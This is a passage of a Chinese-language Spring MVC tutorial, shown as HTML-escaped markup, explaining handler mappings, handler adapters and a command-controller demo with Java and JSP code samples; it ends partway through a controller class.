&lt;code class=&quot;hljs xml&quot;&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;${hello}&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;（7）浏览器访问&lt;/strong&gt;&lt;br/&gt;  访问地址：http://localhost:8080/day63_SpringMVC_01/hello.do&lt;/p&gt;
&lt;h2 id=&quot;h4springmvc&quot;&gt;&lt;span&gt;&lt;strong&gt;4、根据程序分析springmvc执行流程(画图)&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;该图同SpringMVC执行流程图（运行原理）&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;h5&quot;&gt;&lt;span&gt;&lt;strong&gt;5、处理器映射器&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;h3 id=&quot;h51beannameurlhandlermapping&quot;&gt;&lt;span&gt;&lt;strong&gt;5.1、配置默认处理器映射器(BeanNameUrlHandlerMapping)&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;功能：寻找Controller&lt;br/&gt;   根据url请求去匹配bean的name属性url，从而获取Controller&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/10/26/5XOwT9.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h52simplehandlermapping&quot;&gt;&lt;span&gt;&lt;strong&gt;5.2、配置集中处理器映射器(SimpleHandlerMapping)&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;功能：寻找Controller&lt;br/&gt;   根据浏览器url匹配简单url的key，key通过Controller的id找到Controller&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/10/26/5Xb56O.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h53classnamehandlermapping&quot;&gt;&lt;span&gt;&lt;strong&gt;5.3、配置类名处理器映射器(ClassNameHandlerMapping)&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;功能：寻找Controller&lt;br/&gt;   直接根据类名（UserController），类名.do来访问，类名首字母小写&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/10/26/5XbD3q.png&quot; alt=&quot;&quot;/&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;3个处理器映射器可以共存。均可以访问成功。&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;h6&quot;&gt;&lt;span&gt;&lt;strong&gt;6、处理器适配器&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;h3 id=&quot;h61simplecontrollerhandleradapt&quot;&gt;&lt;span&gt;&lt;strong&gt;6.1、配置默认处理器适配器(SimpleControllerHandlerAdapt)&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;功能：执行Controller&lt;br/&gt;   负责执行实现了Controller接口的后端控制器，例如：UserController，调用Controller里面的方法，返回ModelAndView。&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/10/26/5XbFed.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;默认处理器适配器源码分析，如下图所示：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/10/26/5XbX0r.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h62httprequesthandleradapter&quot;&gt;&lt;span&gt;&lt;strong&gt;6.2、配置请求处理器适配器(HttpRequestHandlerAdapter)&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;功能：执行Controller&lt;br/&gt;   负责执行实现了HttpRequestHandler接口的后端控制器。&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/10/26/5XbBMe.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;演示过程：&lt;br/&gt;  自定义实现了接口HttpRequestHandler的实现类HttpController，如下图所示：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/10/26/5XbHRR.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;  在springmvc.xml中配置自定义的bean，即自定义的HttpController，如下图所示：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/10/26/5XbmaY.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;  &lt;strong&gt;&lt;code&gt;上面的这种方式无限接近servlet的开发。&lt;/code&gt;&lt;/strong&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;&lt;code&gt;2个处理器适配器可以共存。&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;h7&quot;&gt;&lt;span&gt;&lt;strong&gt;7、命令控制器&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;h3 id=&quot;h71controller&quot;&gt;&lt;span&gt;&lt;strong&gt;7.1、Controller简介&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;1、收集、验证请求参数并绑定到命令对象；&lt;br/&gt;2、将命令对象交给业务对象，由业务对象处理并返回模型数据；&lt;br/&gt;3、返回ModelAndView（Model部分是业务对象返回的模型数据，视图部分是逻辑视图名）。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;普通控制器(继承接口Controller，继承接口HttpRequestHandler)&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;命令控制器(继承抽象类AbstractCommandController)
&lt;ul&gt;&lt;li&gt;&lt;span&gt;例子：跳转到添加页面，进行页面跳转，参数提交get请求或者post请求&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;参数控制器(类ParameterizableViewController)&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Springmvc通过&lt;code&gt;命令设计模式&lt;/code&gt;接受页面参数。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;h72&quot;&gt;&lt;span&gt;&lt;strong&gt;7.2、演示：自定义命令控制器&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;示例如下：&lt;br/&gt;（1）自定义命令控制器&lt;/p&gt;
&lt;pre readability=&quot;13.5&quot;&gt;
&lt;code class=&quot;hljs java&quot; readability=&quot;21&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;package&lt;/span&gt; com.itheima.controller;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; javax.servlet.http.HttpServletRequest;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; javax.servlet.http.HttpServletResponse;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.springframework.validation.BindException;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.springframework.web.servlet.ModelAndView;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.springframework.web.servlet.mvc.AbstractCommandController;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; com.itheima.domain.User;&lt;/p&gt;&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@SuppressWarnings&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;deprecation&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;CommandController&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;AbstractCommandController&lt;/span&gt; &lt;/span&gt;{&lt;/p&gt;&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;CommandController&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.setCommandClass(User.class);&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;protected&lt;/span&gt; ModelAndView &lt;span class=&quot;hljs-title&quot;&gt;handle&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(HttpServletRequest request, HttpServletResponse response, Object command,&lt;br/&gt;BindException errors)&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;{&lt;br/&gt;&lt;/p&gt;&lt;p&gt;&lt;br/&gt;User user = (User) command;&lt;br/&gt;ModelAndView mv = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; ModelAndView();&lt;br/&gt;mv.addObject(&lt;span class=&quot;hljs-string&quot;&gt;&quot;user&quot;&lt;/span&gt;, user);&lt;br/&gt;mv.setViewName(&lt;span class=&quot;hljs-string&quot;&gt;&quot;index&quot;&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; mv;&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;（2）定义javaBean&lt;/p&gt;
&lt;pre readability=&quot;7&quot;&gt;
&lt;code class=&quot;hljs java&quot; readability=&quot;8&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;package&lt;/span&gt; com.itheima.domain;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; java.util.Date;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;User&lt;/span&gt; &lt;/span&gt;{&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; Integer id;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; String username;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; String age;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; Date birthday;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; String address;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; Integer &lt;span class=&quot;hljs-title&quot;&gt;getId&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; id;&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;setId&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(Integer id)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.id = id;&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String &lt;span class=&quot;hljs-title&quot;&gt;getUsername&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; username;&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;setUsername&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(String username)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.username = username;&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String &lt;span class=&quot;hljs-title&quot;&gt;getAge&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; age;&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;setAge&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(String age)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.age = age;&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; Date &lt;span class=&quot;hljs-title&quot;&gt;getBirthday&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; birthday;&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;setBirthday&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(Date birthday)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.birthday = birthday;&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String &lt;span class=&quot;hljs-title&quot;&gt;getAddress&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; address;&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;setAddress&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(String address)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.address = address;&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;（3）封装参数页面&lt;br/&gt;  文件位置：/day63_SpringMVC_01/WebRoot/WEB-INF/jsps/add.jsp&lt;br/&gt;add.jsp&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs xml&quot;&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;%@&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;page&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;language&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;java&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;contentType&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text/html; charset=UTF-8&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;pageEncoding&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt;%&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;&amp;lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;meta&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;http-equiv&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;content&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text/html; charset=UTF-8&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;Insert title here&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;form&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;action&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;${pageContext.request.contextPath}/command.do&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;method&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;post&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;姓名：&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;username&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;username&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;年龄：&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;age&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;age&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;生日：&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;birthday&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;birthday&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;地址：&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;address&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;address&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;提交&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;（4）获取参数页面&lt;br/&gt;  文件位置：/day63_SpringMVC_01/WebRoot/WEB-INF/jsps/index.jsp&lt;br/&gt;index.jsp&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs xml&quot;&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;%@&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;page&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;language&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;java&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;contentType&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text/html; charset=UTF-8&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;pageEncoding&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt;%&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;&amp;lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;meta&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;http-equiv&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;content&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text/html; charset=UTF-8&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;Insert title here&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;${user.username}---${user.age}---${user.birthday}---${user.address}&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;（5）跳转到add页面&lt;br/&gt;  由于add页面在WEB-INF下面不能直接访问，需要通过Controller来访问。&lt;/p&gt;
&lt;pre readability=&quot;8.5&quot;&gt;
&lt;code class=&quot;hljs java&quot; readability=&quot;11&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;package&lt;/span&gt; com.itheima.controller;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; javax.servlet.http.HttpServletRequest;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; javax.servlet.http.HttpServletResponse;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.springframework.web.servlet.ModelAndView;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.springframework.web.servlet.mvc.Controller;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;ToAddController&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;implements&lt;/span&gt; &lt;span 